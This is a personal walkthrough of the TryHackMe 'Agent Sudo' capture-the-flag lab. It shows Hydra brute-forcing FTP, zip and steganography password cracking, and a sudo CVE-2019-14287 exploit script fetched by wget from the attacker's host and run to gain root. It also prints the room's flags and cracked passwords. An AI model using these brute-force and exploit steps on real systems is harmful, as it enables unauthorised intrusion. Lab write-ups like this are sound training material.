### Agent-sudo

export IP - 10.10.25.133

#### Author's Note

Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.


#### Enumerate

Enumerate the machine and get all the important information

How many open ports?
- 3

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ nmap -sC -sV -oN nmap_results.txt 10.10.25.133
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 10:28 EDT
Nmap scan report for 10.10.25.133
Host is up (0.71s latency).
Not shown: 990 closed tcp ports (conn-refused)
PORT      STATE    SERVICE  VERSION
21/tcp    open     ftp      vsftpd 3.0.3
22/tcp    open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp    open     http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
212/tcp   filtered anet
544/tcp   filtered kshell
2013/tcp  filtered raid-am
4004/tcp  filtered pxc-roid
8649/tcp  filtered unknown
15000/tcp filtered hydap
41511/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 212.52 seconds
                                                              
```

Looking at the webpage we are greeted with a message:

![[Pasted image 20220818203145.png]]

From there we can use burp to check what is happening:

![[Pasted image 20220818203258.png]]

Upon checking, we can see the `User-Agent` that Agent R is referring. We can change this to C, like so:

![[Pasted image 20220818203403.png]]

After that we are greeted by a redirection page:

![[Pasted image 20220818203431.png]]

![[Pasted image 20220818203442.png]]

![[Pasted image 20220818203458.png]]

Using these information, we can now use hydra to crack ftp password (remember nmap, port 22 and port 80?) since Agent R said password is weak:

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.170.97 ftp -t 4
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-18 20:24:14
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ftp://10.10.170.97:21/
[STATUS] 48.00 tries/min, 48 tries in 00:01h, 14344351 to do in 4980:41h, 4 active
[STATUS] 48.00 tries/min, 144 tries in 00:03h, 14344255 to do in 4980:39h, 4 active
[21][ftp] host: 10.10.170.97   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 20:29:35
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ 


```

#### Hash cracking and brute-force

Done enumerate the machine? Time to brute your way out.

FTP Password: crystal

Use the username and password acquired from earlier 

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ ftp 10.10.170.97
Connected to 10.10.170.97.
220 (vsFTPd 3.0.3)
Name (10.10.170.97:kali): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||62242|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||10689|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |**************************************************************************|   217        1.39 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (0.29 KiB/s)
ftp> 

```


![[Pasted image 20220818203845.png]]

Using binwalk, i checked for any zip files inside the pictures:

```

┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

                                                                                                                      
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ binwalk cute-alien.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

                                                                                                                      
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]


```

After that, i extracted the zip file on the image using binwalk -e flag:

```

┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ binwalk cutie.png -e  

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

                                                                                                                      
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ ls
cute-alien.jpg  cutie.png  _cutie.png.extracted  gobuster_scan.txt  nmap_results.txt  README.md  To_agentJ.txt


```

Once zip file is extracted, i used ssh2john to invoke zipfile to convert to hash file:

```

┌──(kali㉿kali)-[~/…/MoonShine/CTF/Agent-sudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  To_agentR.txt

┌──(kali㉿kali)-[~/…/MoonShine/CTF/Agent-sudo/_cutie.png.extracted]
└─$ zip2john 8702.zip > 8702_hash.txt
                                               

```

Once done, proceed with john the ripper to brute force the hash and extract the password:

```

┌──(kali㉿kali)-[~/…/MoonShine/CTF/Agent-sudo/_cutie.png.extracted]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt 8702_hash.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2022-08-18 20:57) 2.325g/s 57153p/s 57153c/s 57153C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                      
┌──(kali㉿kali)-[~/…/MoonShine/CTF/Agent-sudo/_cutie.png.extracted]
└─$ 
                                                                                                                      
┌──(kali㉿kali)-[~/…/MoonShine/CTF/Agent-sudo/_cutie.png.extracted]
└─$ 


```

Once the zip file is extracted, we take a look at the contents of To_agentR.txt:


![[Pasted image 20220818212316.png]]

we see QXJlYTUx, but what is it?

Upon searching the internet, I checked for decoder online and found the base64 decoder/encoder. Tried to decode and found the answer:


steg password
- Area 51

![[Pasted image 20220818212419.png]]

Looking at the other file (cute-alien.jpg), we can use steghide to check if someone left a message there:

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
                                           
```

![[Pasted image 20220818213416.png]]

Who is the other agent (in full name)?
- james

SSH password
- hackerrules!

Using that, login to ssh as usual:

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
└─$ ssh james@10.10.170.97      
james@10.10.170.97's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Aug 19 01:36:17 UTC 2022

  System load:  0.0               Processes:           96
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.10.170.97
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ 

```

#### Capture the user flag

You know the drill.

What is the user flag?
- b03d975e8c92a7c04146cfa7a5a313c7

```
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
james@agent-sudo:~$ 

```


What is the incident of the photo called?
- Roswell alien autopsy

Downloaded the image from user james site (using http.server) then reverse image using bing:

![[Pasted image 20220818222920.png]]

#### Privilege escalation


Enough with the extraordinary stuff? Time to get real.

CVE number for the escalation
-  CVE-2019-14287

Upon checking, we can first check sudo version as well as sudo -l for exploits:

![[Pasted image 20220818224828.png]]

```
### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.21p2

james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ 

```

Looking through the internet we can find CVE-2019-14287
 that affectes sudo versions 1.8.28 and below:


![[Pasted image 20220818225003.png]]

Upon thorough investigation we can also find scripts in .sh:

https://github.com/n0w4n/CVE-2019-14287

We can clone this in our kali machine, then use http.server to transfer files to the target. Then after what, we can now perform chmod then run the shell script to acquire the root and capture the flag:

```
james@agent-sudo:~$ wget "http://10.4.73.167:8081/sudo.sh"
--2022-08-19 02:46:30--  http://10.4.73.167:8081/sudo.sh
Connecting to 10.4.73.167:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1121 (1.1K) [text/x-sh]
Saving to: ‘sudo.sh’

sudo.sh                       100%[================================================>]   1.09K  --.-KB/s    in 0.001s  

2022-08-19 02:46:32 (1.17 MB/s) - ‘sudo.sh’ saved [1121/1121]

james@agent-sudo:~$ ls
Alien_autospy.jpg  LinEnum.sh  sudo.sh  user_flag.txt
james@agent-sudo:~$ chmod +x sudo.sh
james@agent-sudo:~$ ./sudo.sh
[sudo] password for james: 
[-] This user has sudo rights
[-] Checking sudo version
[-] This sudo version is vulnerable
[-] Trying to exploit
root@agent-sudo:~# whoami
root
```


What is the root flag?
- b53a02f55b57d4439e3341834d70c062

![[Pasted image 20220818225253.png]]


(Bonus) Who is Agent R?
- DesKel

END